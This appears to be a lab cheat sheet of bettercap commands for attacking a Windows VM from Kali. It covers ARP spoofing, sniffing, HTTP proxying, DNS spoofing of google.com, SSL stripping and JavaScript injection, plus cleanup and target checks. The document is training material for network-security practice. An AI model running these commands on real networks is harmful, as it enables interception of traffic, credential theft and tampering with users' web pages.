# ARPple Command Reference

## Kali attacker commands

```bash
ip route
ping win-vm
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -iface eth0
```

## Bettercap commands

```text
net.probe on
net.show
set arp.spoof.targets 192.168.85.130
arp.spoof on
net.sniff on
http.proxy on
```

## Cleanup commands

```bash
arp.spoof off
http.proxy off
exit
sudo sysctl -w net.ipv4.ip_forward=0
```

## DNS spoofing commands

```text
set arp.spoof.targets 172.20.10.4
arp.spoof on
net.probe on
net.recon on
set dns.spoof.domains google.com
set dns.spoof.address 172.20.10.5
dns.spoof on
set http.proxy.sslstrip true
set http.proxy.injectjs alert('You have been pwned!')
http.proxy on
net.sniff on
```

## Target validation

- Windows VM should be able to ping `google.com` and `kali`.
- Use browser access to `http://zero.webappsecurity.com/index.html` or `http://demo.testfire.net` during capture.
